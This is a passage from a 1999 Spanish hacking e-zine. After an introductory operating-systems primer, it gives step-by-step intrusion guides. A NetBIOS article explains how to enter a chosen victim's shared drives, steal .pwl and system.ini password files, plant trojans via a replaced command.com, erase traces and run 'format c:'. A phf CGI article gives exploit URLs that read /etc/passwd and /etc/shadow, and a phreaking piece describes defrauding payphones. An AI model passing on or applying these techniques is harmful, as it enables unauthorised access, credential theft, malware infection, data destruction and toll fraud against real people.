                     recursos del sistema, por lo que se ellos depende el
                     rendimiento del mismo. Este tipo de software tiene un
                     contacto directo con el harware, y se encarga de
                     administrarlo y coordinarlo. Dentro del software de
                     sistema podemos encontrar los sistemas operativos (UNIX,
                     Windows, LinuX, etc) y los lenguajes de programacion de
                     bajo nivel.

SOFTWARE DE APLICACION: El software de aplicacion esta dise¤ado para
                        solucionar problemas al usuario y automatizar tareas.
                        Hay programas de aplicacion de todo tipo (hojas de
                        calculo, procesadores de texto, calculadoras,
                        gestores comerciales, etc).

                        El software de aplicacion necesita del software de
                        sistema para realizar sus funciones, ya que no tiene
                        contacto directo con el hardware (pero si que lo
                        tiene con el usuario).

***********************FUNCIONAMIENTO DEL SOFTWARE***************************

                                 USUARIO
                                     ³
                                  ³   
                    ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
                    º        Dispositivos E/S       º
                    º ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ» º
                    º º              ³           º º
                    º º           ³              º º
                    º º ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿ º º
                    º º ³ Software de aplicaion ³ º º
                    º º ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ º º
                    º º              ³           º º
                    º º           ³              º º
                    º º  ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿  º º
                    º º  ³ Software de sistema ³  º º
                    º º  ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ  º º
                    º º              ³           º º
                    º º           ³              º º
                    º º  ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»  º º
                    º ÈÍÍ¼      HARDWARE       ÈÍÍ¼ º
                    º                               º
                    ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼                   


            Dispositivos E/S -> Dispositivos de entrada y salida

*****************************************************************************

En este esquema se puede observar como el usuario opera sobre el software de
aplicacion (mediante los dispositivos de entrada y salida), este comunica las
ordenes pedidas por el usuario al software de sistema, que se encargara de
dirigir y coordinar al hardware para que se realize la tarea que el usuario
pide. Segudamente el software de sistema comunica al software de aplicacion
los resultados, y este lo comunica (tambien mediante los dispositivos de
entrada y salida) al usuario.

NOTA: No todos los dispositivos de entraday y salida sirven para poner en
      contacto el usuario con el software. Por ejemplo tenemos el Modem, que
      se encarga de poner en contacto el computador con la linea telefonica.

­Bueno! Despue de tragarnos todo ese rollo del hardware y el software vamos a
soltar otro sobre el fondo de los sistemas operativos (­­­alabado sea Bill
Gates!!!). La verdad es que verdad es que no he echo ninguna maqueta sobre la
segunda parte de este texto, asi que escribire sobre la marcha. A ver que
sale....

Para empezar creo que sera mejor mostrar un peque¤o esquema de resumen de lo
ya explicado antes :)

*****************************************************************************

                                         /Dispositivos E/S
                                        /
                                       /
                                      /
                                     /   
                          /Hardware <-----Procesador
                         /           \
                        /             \              /Primaria
                       /               \            /
                      /                 \          / 
                     /                   \Memoria < 
                    /                              \
       Computadora <                                \
                    \                                \Secundaria
                     \                               
                      \
                       \               /Aplicacion
                        \             /
                         \           /
                          \Software <
                                     \
                                      \
                                       \Sistema

*****************************************************************************

NOTA: ­Juer! ­­Que esquema mas chulo que me ha salido!!

Seguidamente nos vamos a centrar en los sistemas operativos (que de echo era
el objetivo principal de este texto), que junto a los lenguajes de
programacion de bajo nivel forma parte del software de sistema, pero entes
que nada.... ¨Que co¤o es un sistema operativo? (no se cuantas veces habra la
respuesta a esta pregunta a lo largo del texto, pero por si acaso....) Un
sistema operativo no es mas que un software de sistema formado por un
conjunto de programas y que se encarga de gestionar los recursos del
computador, y por lo tanto de el depende el rendimiento del sistema. Pero
entrando mas a fondo podemos decir que un sistema operativo puede ser visto
como un conjunto de capas o niveles de software atraves de las cuales circla
la orden del usuario. Asi pues todo (o casi todo ;) ) sistema operativo se
compone de tres capas basicas; el nucleo, el nivel de  servicio y el nivel de
orden.

NUCLEO: (tambien conocido como kernel) Es el nivel mas interno de todo 
        sistema operativo, desde este nivel se realizan las funciones de
        carga del sistema, se administran los recursos, etc. y de echo es el
        unico que tiene contacto directo con el hardware del computador, por
        lo que un sistema operaivo puede ser compatible con distintas
        computadoras (todas con diferente hardware) unicamente cambiando el
        kernel.

        Normalmente parte del kernel esta escrita en lenguaje ensamblador,
        que es el leguaje de mas bajo nivel despues del mismisimo lenguaje
        maquina (­Ah co¤e! aprobechare para decir que necesitamos a alguien
        que se dedique a escribir un cursillo de ASM, joder, que nadie se
        anima).

                   <Ripe: Parece que ya lo tenemos, pero su
                          articulo no llega :( >

NIVEL DE SERVICIO: En este nivel el sistema operativo se ancarga de analizar
                   las ordenes relaizadas por el usuario para mandarselo al
                   kernel en forma de instruccion detallada, en algunos
                   sistemas se limita al usuario de realizar ciertas acciones
                   sobre su computador (Vease libro avanzado de windows 98).

NIVEL DE ORDEN: (tambien conozido como shell) El nivel de orden es la parte
                mas externa del sistema operativo, y es en el en el que el
                usuario realiza sus peticiones sobre el sistema. Basicamente,
                podriamos decir que hay dos tipos de shell, en entorno
                grafico (bastante mas intuitivo y agradable para el usuario),
                y en  entorno a lenguaje de ordenes (algo mas complicado,
                pero por norma general mas potente).

Vistas ya las 3 capas basicas de las que se compone un sistema operativo
vamos a explicar las caracteristicas que un sistema operativo puede tener.

Dependiendo de la forma de actuar de un sistema operativo ante ciertas
situaciones, diremos que un sistema operativo puede ser monousuario,
multiusuario, monotarea o multitarea.

MONOUSUARIO: Los sistemas operativos monousuario son aquellos que solo
             pueden utilizados por una unica terminal simultaneamente. Este
             tipo de sistemas operativos no acostuman a estar orientado
             a redes (­­vease ventanukos!!).

MULTIUSUARIO: Diremos que un sistema operativo es multiusuario multiusuario
              (Esta definicion me suena a definicion de mates... :-? ) si
              mas de una terminal puede estar usando el computador al
              simultaneamente. Todo sistema multiusuario es al mismo tiempo
              multitarea, ya que este ha de ser capaz de realizar las tareas
              que le piden cada uno de los usuarion sin que ellos tengan que
              esperar que las taread de los demas usuario terminen. Para usar
              este tipo de sistema operativo hay dos maneras basicas de
              hacerlo, mediante terminales reales y mediante terminales
              imaginarias.

********EJEMPLO DE UTILIZACION DE SISTEMA MULTITAREA (TERMINAL REAL)*********                                      


                 SISTEMA MULTITAREA
            ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
            ºÚÄÄÄÄÄÄÄÄÄÄÄÄ¿ÚÄÄÄÄÄÄÄÄÄÄÄ¿º
            º³            ³³  Memoria  ³º      ÉÍÍÍÍÍÍÍÍÍÍÍÍ»
            º³ Procesador ³³           ³ºÄÄÄÄÄÄº Terminal 1 º
            º³            ³³ Principal ³º      ÈÍÍÍÍÍÍÍÍÍÍÍÍ¼
            ºÀÄÄÄÄÄÄÄÄÄÄÄÄÙÀÄÄÄÄÄÄÄÄÄÄÄÙº
            º ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿ º
            º ³      Unidades de      ³ º      ÉÍÍÍÍÍÍÍÍÍÍÍÍ»
            º ³                       ³ ºÄÄÄÄÄÄº Terminal 1 º
            º ³     Almacenamiento    ³ º      ÈÍÍÍÍÍÍÍÍÍÍÍÍ¼
            º ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ º
            ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
                          ³
                   ÚÄÄÄÄÄÄÁÄÄÄÄÄÄÄ¿
                   ³ Dispositivos ³
                   ³              ³
                   ³     E/S      ³
                   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

*****************************************************************************


******EJEMPLO DE UTILIZACION DE SISTEMA MULTITAREA (TERMINAL IMAGINARIA)*****                            


     SISTEMA MULTITAREA        ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»  ºÚÄÄÄÄÄÄÄÄÄÄÄÄ¿ÚÄÄÄÄÄÄÄÄÄÄÄ¿º ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
ºÚÄÄÄÄÄÄÄÄÄÄÄÄ¿ÚÄÄÄÄÄÄÄÄÄÄÄ¿º  º³            ³³  Memoria  ³º ³ Dispositivos ³
º³            ³³  Memoria  ³ºÄÄº³ Procesador ³³           ³ºÄ´              ³
º³ Procesador ³³           ³º  º³            ³³ Principal ³º ³     E/S      ³
º³            ³³ Principal ³º  ºÀÄÄÄÄÄÄÄÄÄÄÄÄÙÀÄÄÄÄÄÄÄÄÄÄÄÙº ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
ºÀÄÄÄÄÄÄÄÄÄÄÄÄÙÀÄÄÄÄÄÄÄÄÄÄÄÙº  ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
º ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿ º  ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»    
º ³      Unidades de      ³ º  ºÚÄÄÄÄÄÄÄÄÄÄÄÄ¿ÚÄÄÄÄÄÄÄÄÄÄÄ¿º ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿    
º ³                       ³ º  º³            ³³  Memoria  ³º ³ Dispositivos ³
º ³     Almacenamiento    ³ ºÄÄº³ Procesador ³³           ³ºÄ´              ³      
º ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ º  º³            ³³ Principal ³º ³     E/S      ³
ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼  ºÀÄÄÄÄÄÄÄÄÄÄÄÄÙÀÄÄÄÄÄÄÄÄÄÄÄÙº ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
              ³                ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
       ÚÄÄÄÄÄÄÁÄÄÄÄÄÄÄ¿       
       ³ Dispositivos ³        ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
       ³              ³                    Terminales imaginarias
       ³     E/S      ³
       ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

*****************************************************************************

MONOTAREA: Un sistema monotarea es aquel que solo es capaz de ejecutar una
           cosa simultaneamente, ya que no esta capazitado para administrar
           los recursos de la memoria principal entre diversos programas o
           aplicaciones en ejecucion.

           Todo sistema monotarea es al mismo tiempo monousuario (supongo que
           ya habras deducido por que ¨no?).

MULTITAREA: El sistema multitares (vease... ¨Windows?)



     

ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
º         * ARTICULO *         º      * TEMA *      º       * NIVEL *       º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄº
º9.- Cuso de ASM               º    Programacion    º         Medio         º
ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
                                                                          [ ]

Este articulo tenis que haber llegado la semana pasada, por motivos que yo no
se no ha llegado. Trataremos de escribir una segunda edicion (Como el
windows :P) en la que se incluya este articulo.





ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
º         * ARTICULO *         º      * TEMA *      º       * NIVEL *       º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄº
º10.- Un paseo por el pasado   º  Hacking/Phreaking º         Bajo          º     
ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
                                                                   [ Varios ]

El hack (el phreak tampoco) no aparece de golpe (ni mucho menos), hay una
larga historia detras, y duranto toda esa historia de mas de 1000 a¤os se han
encontrado y utilizado muchas maneras de entrar en un computador ageno, en
este articulo pretendemos que el lector conozca (si es que aun no los
conocia) las viejas maneras (buuf... viejas pero siguen funcionando en algun
caso, y es que la gente es realmente burra). Bueno basta de royo....


                                 
==========================={ Entrando por NetBios }==========================
CAMPO: Hacking   
SISTEMA OPERATIVO: Win9x/¨Win2000?
AUTOR DEL TEXTO: AiNaKeR
-----------------------------------------------------------------------------

Saludos, soy AiNaKeR y me podeis ver de vez en cuando por el IRC, en canales
como #hacker_novatos (­­ saludos gente !!) Weno, decir que el escribir este
articulucho me da casi verguenza, pero ya estoy cansado de explicar a la
gente como entrar en los PC's desde el NetBios (incluso pense ponerlo todo en
un alias, xD).

Bien, para esto usaremos el programa que win98 trae por defecto (para ke
luego no digais que no podeis porque no encontrais el programa :P), el
nbtstat.exe

Entonces, selecionamos un pobre martir y comenzamos...

Tecleamos

    C:\>nbtstat -a <ip de la victima>

Para aquellos que me digais ¨y como se a ip del tio? (si, en serio ke lo
preguntan...) pos le haceis un /whois nick y al host (eso ke sale detras de
la @) le haceis un dns; /dns <host>, y entonces ejecutais el nbtstat -a ip

                 <Ripe: Si usas el mIRC tambien es posible
                        hacer /dns <nick> >

Si aun es muy dificil para vosotros (retiraros) ... DarkAngel escribio un
script asi

 On 1:Dns: {
 echo $iaddress
 clipboard $iaddress
 run nbtstat -A $iaddress
 }

     [ Anda Dark, para ke veas ke respeto el creador, aunke yo tb lo
       habria hecho, :D ]

                    <Ripe: mmm... pues yo no XD>

Bueno, ahora pasemos a la accion...

Ejecutamos el nbtstat con CaraPan 152.168.32.25 (Ke te den kapullo, :P) y
dependiendo de si tiene algo compartido, usa windows, y tiene el NetBios
activado, nos saldra o el mensaje

                "Host not found"
                
...no hay nada que hacer (por ahora y basandonos en este articulo ;) ), asi
ke a buscar a otro... Pero suponiendo ke si ke tiene todo como dios manda
(pj 62.152.02.36),  nos saldra un mensaje del tipo...


               NetBIOS Remote Machine Name Table

               Name               Type         Status
               ---------------------------------------------
               SISIPO         <00>  UNIQUE      Registered
               ORCA           <00>  GROUP       Registered
               SISIPO         <03>  UNIQUE      Registered
               SISIPO         <20>  UNIQUE      Registered
               ORCA           <1E>  GROUP       Registered

               MAC Address = 44-45-53-54-00-00


Tenemos ke la makina de este acepta entradas <20> y que se llama SISIPO.
Si bien cuando veamos a alguien lo mas normal sea esto:
        

               NetBIOS Remote Machine Name Table

               Name               Type         Status
               ---------------------------------------------
               CARAPAN         <00>  UNIQUE      Registered
               AMANDA          <20>  GROUP       Registered
               CARAPAN         <03>  UNIQUE      Registered

               MAC Address = 44-45-53-54-00-00


Ok, entonces que hacer?

Creamos el archivo c:\windows\lmhost (y no sobreescribir el lmhost.sam ke
trae windows por defecto) y escribimos la IP y la MAQUINA, o sea:

     62.152.02.36 SISIPO

NOTA: En los renglones siguientes podemos ir escribiendo mas makinas...

Acto seguido, se actualiza la lista del NetBios con el comando:

  <<  nbtstat -r >>

y nos saldra el mensaje...

Successful purge and preload of the NBT Remote Cache Name Table.

Ok, continuamos....

Ahora tenemos muchas formas de entrar, pero primero, miramos que es a lo que
tenemos acceso, okis?

Para ello ponemos...

    C:\>Net view  \\SISIPO

 Y si lo hemos hecho bien dira:


 Recursos compartidos \\SISIPO

 Compartido   Tipo         Comentario
 ---------------------------------------
 CDROM        Disco
 Unidad C     Disco
 Stylus 640   Impresora
 El comando ha sido ejecutado con xito.


Tambin podemos (para los que no os va el MS-DOS :P) buscarlo desde Buscar PC
en inico... y se nos abrira una ventana igual que cuando estamos conectados
en RED (si no lo habeis probado, hacedlo, que le Quake 3 esta demasiado), o
sea, que nos saldran las carpetas que el tio tiene compartidas... o en
ejecutar \\SISIPO


  ­­Felicidades, ya estas dentro!!

Ahora, si no sabeis que hacer, os dire lo mas interesante...

1.- Pillar todos los *.pwl que haya en c:\windows, ya que alli se guardan las
    contrase¤as y nombres de usuario

2.- Pillar el system.ini, ya que alli tambin se guardan contrase¤as y
    nombres de usuario sin encriptar y nos pueden ser de gran ayuda al
    crackear las PWL's

3.- Si el tio entra en el IRC, busca en los logs todos los que sean con BOT's
    ya que asi saldran sus contrase¤as...

Y por supesto motones de cosas que se me ocurren ahora mismo... pero son las
2:07 y ma¤ana tengo clase, asi que abrevio, pero para que penseis un poco
mmmm.... os imaginais, pj, (me encanta esto) subirle a un directorio perdido
los servers de los troyanos que mas nos gusten, ahora, coger y renombar el
Command.com a cualkier_nombre.com, editamos un bat, entonces, desde aki,
hacemos la llamada a los que infectan, y luego a ese cualkier_nombre.com,
despues compilamos el bat a com y lo llamamos command.com, de forma que
cuando el tio vaya a abrir una ventana de MS-DOS, se infectara... ;)

Hay muchas formas de ampliar esto si conoceis los BAT's, de forma que despues
de haber infectado, el propio bat borre las huellas... pero no lo pongo,
para que penseis un poco... :PP

Y si realmente sois nada mas que unos "porculeros" y no hackers, se os
ocurre lo que podria pasar si al final de la linea intro ducimos la orden
format c: sin confirmacion?

   XDDDDDDDDDDDDDDDD

Si de verdad, sois hackers (y no como yo, que solo aprendo, aunque esto si
lo hago... :>), podriais dejar un leeme.txt indicando quien eres y por donde
le has entrado... o lo que queda mas chulo, si tiene troyanos averigua que
fondo de escritorio tiene puesto y editalo y escribe en el lo anterior!! :)

Solo se¤alar que para que todo esto funcione, has de tener en la conexion,
en propiedades la casilla de NetBEUI y Conectarse a la red activadas, y en
el Panel de Control y en Red,  Compartir impresoras y archivos.

Nada mas!

    [DarkAngel, depues de haber terminado de escribir esto, me dijeron que
     tu habias escrito otro hace algo, pero quiero que sepas que no ha sido
     una copia tan solo use tu script y hablo de ti, pero porque me parecio
     interesante..]

                   <Ripe: Si, si que es intresante... xDD>

Saludos desde aqui a toda la gente del canal #hacker_novatos, #hackworld y
#hack, y tambien al insufrible Nakesi (hola Nake :) )

                <Ripe: Yo saludo a mi madre que me esta viendo>

=============================================================================


                                   
================================{ Mitico PHF }===============================
CAMPO: Hacking   
SISTEMA OPERATIVO: UNIX
AUTOR DEL TEXTO: Ripe
-----------------------------------------------------------------------------

Se ha escrito tanto ­­tantisimo!! sobre este ya mitico (y super-viejo) bug,
que da incluso verguenza volverlo a hacer, pero debido a la intencio de este
"paseo por el pasado" es necesario repasarlo.

NOTA: No me cansare de repetirlo, pero.... ­­Este jodido bug sigue funcinando
      en una gran cantidad de UNIX!! y es que hay por ahi demasiado
      administrador que se cree que basta con usar la cuenta de root para
      crear shells para sus colegas....

Metiendonos ya de lleno en el bug, que sera contado de forma rapida (Si
quieres mas informacion sobre el busca uno de los 878975 textos sobre este
bug que se encuentran flotando por el cyberspacio esperando que TU los
recojas). Antes que nada dire que este bug funciona unica y exclisivamente
con un sistema UNIX... he llegado a leer textos que lo mezclan con el NT :-?

El bug del phf nos ejecutar comandos del UNIX desde el propio navegador, una
utilidad de ese bug puede ser la de capturar el archivo /etc/passwd o el
/etc/shadow (o el /usr/pepe/religion o... vamos, cualquiera).

-Para pillar el /etc/passwd. deberiamos introducir.

   http://www.victima.com/cgi-bin/phf?Qalias=%0a/bin/cat%20/etc/passwd

-Para el /etc/shadow supongo que ya lo habreis pillado, pero por si acaso no
 me va de escribir una linea mas...

   http://www.victima.com/cgi-bin/phf?Qalias=%0a/bin/cat%20/etc/shadow

NOTA: Este bug tiene muchas mas utilidades, decubrelas tu, que si las tuviera
      que escribir todas conevertiria este E-Zine en el mas laro del mundo
      mundial :)

=============================================================================


                                  
=================================={ free MT }================================
CAMPO: Phreaking   
SISTEMA OPERATIVO: ¨¨Cabinas telefonicas = S.O.??
AUTOR DEL TEXTO: Ripe
-----------------------------------------------------------------------------

Para aquellos que no lo sepais os dire que las MT son los tanques... digo
telefonos azules que usa telefonica para timarnos en la calle (­vamos! por si
aun no lo pillais... son las cavinas telefonicas).

La verdad es que el phreak no es lo mio, y no conozco ninguna explicacion
tecnica que explique el porque de esta forma de llamar gratis, asi que me
limitare a explicar el procedimiento.

Lo primero que hay que hacer es descolgar y comprobar que haya linea... (esto
es facil :P).

Seguidamente procederemos a cortar la linea mediante un truquillo, para
realizarlo necesitaremos algo plano y metalico (las chapas de las latas de
cocacola van de p*ta madre) que introduciremos lo mas a la derecha posible
de la ranura por la que se introducen las targetas. Llegara un momento en que
la cabina pierda la linea.

**************************** CABINA TELEFONICA ******************************

            ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
            ³                                               ³
            ³                                        ³±³    ³
            ³    ÉÍÍÍÍÍÍÍÍÍÍÍÍ»                      ³±³    ³
            ³    ÈÍÍÍÍÍÍÍÍÍ³³¼                      ³±³    ³
            ³               ³                        ³±³    ³
            ³          [Por aqui]                           ³
            ³                                               ³
            ³                                               ³
            ³                                               ³

*****************************************************************************

NOTA: Esto es una cabina telefonica xDDD Y yo dibujo muy mal.

Una vez perdida la linea nosotros pulsaremos la siguiente convinacion de
teclas: 900*, sacaremos la chapa marcaremos el numero de telefono al que
queramos llamar e introduciremos nuevamente la chapita para cortar la linea
de nuevo. Nosotros estaremos con la linea cortada mientras la cabina llama,
por lo que debemos calcular a ojo el tiempo que creemos que tardara el otro
(al que llamamos) en descolgar el telefono. Asi pues cuando creamos que el
otro ha descolgado ya el su telefono nosotros quitaremos la chapita y ale....
a hablar de gorras.

NOTA: No se exactamente porque (aun que me lo imagino) cada minuto y medio
      aproximadamente es necesario reintroducir la chapita durante unos
      segundos para que la conexion no se corte.

NOTA: (otra) Este truco es realmente viejo, por lo que es practicamente
      imposible que encuentres una cabina en la que funcione, sinembaro, si
      la encuentras estas de suerte :)

Si alguien cree que puede darme una explicacion mas tecnica de este error en
las MT de Telefonica que me escriba un mail... me interesa bastante.

                              ripe@mixmail.com

=============================================================================


Bueno, de momento nada mas que contar.... espero que os halla gustado esta
seccion, aun que todo lo que se incluye es algo viejo (Para el proximo
numero nos pasearemos por el futuro... contaremos bugs que aun no se han
encontrado :P).





ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
º         * ARTICULO *         º      * TEMA *      º       * NIVEL *       º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄº
º11.- Proyectos                º     El Futuro      º                       º     
ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
                                                                   [ Editor ]

Poco a poco y a base de proyectos hemos ido creciendo (Mas de lo que cabia
esperar), asi pues vamos a marcar objetivos en cada numero, de esta manera
creceremos mas y mas, hasta superar AL GRAN HERMANO (¨Quien sera?).

1.-COTIZAR EN BORSA: Visto el exito de Terra {7A69} se plantea la posiblidad
                     de lanzarse a la venta de acciones. Si estais intresados
                     en comprar acciones de {7A69} solo teneis que enviar un
                     E-Mail a:

                                     7A69enborsa@acciones.com

                     El precio inicial de las accines es de 3 millones la
                     accion, y la compra minima de acciones es de 1000
                     acciones.

2.-OTROS FORMATOS: No cabe duda que el formato txt es el mas estandarizado y
                   mas facil de leer (Pues basta con tener un simple
                   procesador de textos), pero tampoco cabe duda de que es
                   un formato algo incomodo, por lo que {7A69} se plantea la
                   posiblidad de hacer aparecer el E-Zine en formatos mas
                   vistosos como el HTML o HLP. Si alguien tiene interes en
                   pasar {7A69} a los formatos ya nombrados basta con que
                   mande un Mail a la direccion de correo oficial del
                   E-Zine comunicandolo.

3.-EL MALDITO PHREAK: Parece que en espa¤a los pheakers escasean, aun que
                      sabemos que no es asi... Unicamente un mail de el hijo
                      de un currate de telefonica ofreciendo ayuda, aun que
                      al parecer ese hijo ha cambiado de idea, por que no ha
                      respondido al mail que le mandamos....

                      Venga phreakers, animaros a escribir algun articulo,
                      solo son 100 pts al dia (uy, se me fue la olla :P).
                  

4.-NOTICIAS: La seccion noticias tratara de ser habitual en {7A69}, pero
             nosotros solos no podemos estar atentos a todo lo que pasa en
             el mundo del Undergr0und y de la seguridad informatica, asi que
             hacemos un llamamiento a todos aquellos que se sientan cada
             tarde en el sofa a ver la tele a que se animen a informarse de
             todo lo posible, a redactar noticia, y como no.... a
             enviarnoslas ;)

5.-IRCWAR: Bueno, el irc-war es un temo que no hemos tratado nada por ahora,
           si que para un futuro cercano trataremos de ofreceros un buen
           texto en el que se expliquen las tecnicas que utilizan los
           aficionados a este deporte (¨Deporte?).


Dia a Dia.... ¨Lo que? xD





ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
º         * ARTICULO *         º      * TEMA *      º       * NIVEL *       º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄº
º12.- Noticias / Curiosidades  º     Actualidad     º                       º     
ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
                                                                   [ Editor ]

No podia faltar en un E-Zine como este dedicado al mundo del Undergr0und una
seccion dedicada a las noticias que se dan en este mundo... Bueno, por aqui
la teneis. Algunas de estas noticias han sido sacadas de mi propia web
(http://surf.to/ripe) y ampliadas.



--------------------------{ Se celebra SIMO'99 )-----------------------------
-----------------------------------------------------------------------------

El dia 2 de Noviembre de 1999 tuvo lugar la ignaguracion de la 39¦ edicion de
una de las ferias mas sobre informatica, tecnologia y comunicaciones mas
importantes de Europa. SIMO, como cada a¤o, tuvo lugar en la Madrid y a ella
asistieron mas de 750 expositeres ansiosos por mostrar sus ultimas
tecnologias entre los cuales se encontraban expositores de paises como
Alema¤a, Belgica, Francia, Italia, La gran breta¤a, Holanda, Portugal, e
incluso Estados Unidos (Microsoft... puagh). Esta participacion extrangera
era uno de los objetivos a cumplir en SIMO este a¤o.

El recinto ferial en el que tenia lugar simo (La Feria de Madrid) constaba
de mas de 50.000 m2 ( un 6,5% mas que en la edicion anterior) de pura
tecnologia. El exito fue rotundo y se superaron las 245.000 visitas de la
edicion anterior.

El plato mas fuerte de SIMO'99 se centra en las "nuevas" tecnologias y al
comercio electronico. La telefonia celular no se dejo de lado, y empresas
como Amena, Airtel, Timof.... Telefonica, etc presentaron sus respectivas
ofertas. Telefonica tambien presento su "super-nueva" (ellos la venden asi
aun que no es cierto) tecnologia, la ADSL, que proporciona una alta velocidad
en la transmision de datos. Por otro lado las empresas de Cable (Fibra
obtica) tambien presentaros sus ofertas.

Otra de las secciones que desperto mayor interes fue el del Hardware (perdon
por el error en la web) en la que AMD presentava su nuevo procesador Atlhon,
que es capaz de alcanzar una frecuencia de 900 Mhz (y dentro de poco tienen
previsto llegar a 1 Ghz..... ¨hasta donde llegaremos?) y Intel mostrava
tambien su procesador Intel Pentium III a 600 Mhz.

NOTA: En esta edicion de la SIMO no pudo faltar el Quake3... jeje.

-----------------------------------------------------------------------------


